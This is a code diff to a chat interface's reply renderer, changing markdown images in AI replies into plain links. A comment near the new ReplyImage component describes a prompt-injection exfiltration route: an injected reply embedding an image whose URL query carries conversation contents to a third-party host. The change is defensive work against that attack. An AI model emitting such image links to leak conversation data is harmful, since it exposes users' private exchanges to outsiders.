@@ -1,8 +1,8 @@
 'use client';
 
-import { Fragment, memo, useCallback, useEffect, useLayoutEffect, useRef, useState } from 'react';
+import { Fragment, createContext, memo, useCallback, useContext, useEffect, useLayoutEffect, useRef, useState } from 'react';
 import { ArrowDown, Check, Copy, Wand2 } from 'lucide-react';
-import ReactMarkdown from 'react-markdown';
+import ReactMarkdown, { type Components, type ExtraProps } from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import { ProposalCard } from '@/components/ai/proposal-card';
 import { TypingIndicator } from '@/components/ui/typing-indicator';
@@ -165,6 +165,42 @@ export const REPLY_PROSE = [
   '[&_blockquote]:border-l-2 [&_blockquote]:border-border [&_blockquote]:pl-3 [&_blockquote]:text-muted-foreground',
 ].join(' ');
 
+const REPLY_REMARK = [remarkGfm];
+
+/** Inside a reply's link: an image there is named by its alt text alone (no link in a link). */
+const InReplyLink = createContext(false);
+
+/**
+ * A reply's image, as a link to it rather than an <img>. An image fetches its
+ * URL the moment it renders, with no click, so a reply holding
+ * `![](https://host/?q=…)` (a prompt-injected one, filling the query with
+ * what the conversation said) would hand that to a third party; and saved
+ * replies render on every open, on every device. A link waits for the user,
+ * and shows them where it goes. Named by its alt text, else its address.
+ */
+function ReplyImage({ src, alt }: { src?: string | Blob; alt?: string } & ExtraProps) {
+  const inLink = useContext(InReplyLink);
+  const href = typeof src === 'string' ? src : '';
+  const label = alt?.trim() || href;
+  if (!label) return null;
+  return inLink || !href ? <>{label}</> : <a href={href}>{label}</a>;
+}
+
+/**
+ * Module scope, so a memoised Reply hands ReactMarkdown the same object every
+ * render. The link is the default one (an <a> with its href and title), only
+ * marking its inside for ReplyImage.
+ */
+const REPLY_COMPONENTS: Components = {
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  a: ({ node, ...props }) => (
+    <InReplyLink.Provider value>
+      <a {...props} />
+    </InReplyLink.Provider>
+  ),
+  img: ReplyImage,
+};
+
 const Reply = memo(function Reply({
   m,
   typing,
@@ -187,7 +223,9 @@ const Reply = memo(function Reply({
     <div data-message-role="assistant" data-message-id={m.id} className="group/reply flex flex-col gap-1">
       {text ? (
         <div className={REPLY_PROSE}>
-          <ReactMarkdown remarkPlugins={[remarkGfm]}>{text}</ReactMarkdown>
+          <ReactMarkdown remarkPlugins={REPLY_REMARK} components={REPLY_COMPONENTS}>
+            {text}
+          </ReactMarkdown>
         </div>
       ) : streaming ? (
         // The plugin answers in one piece, so it types; a stream that has not
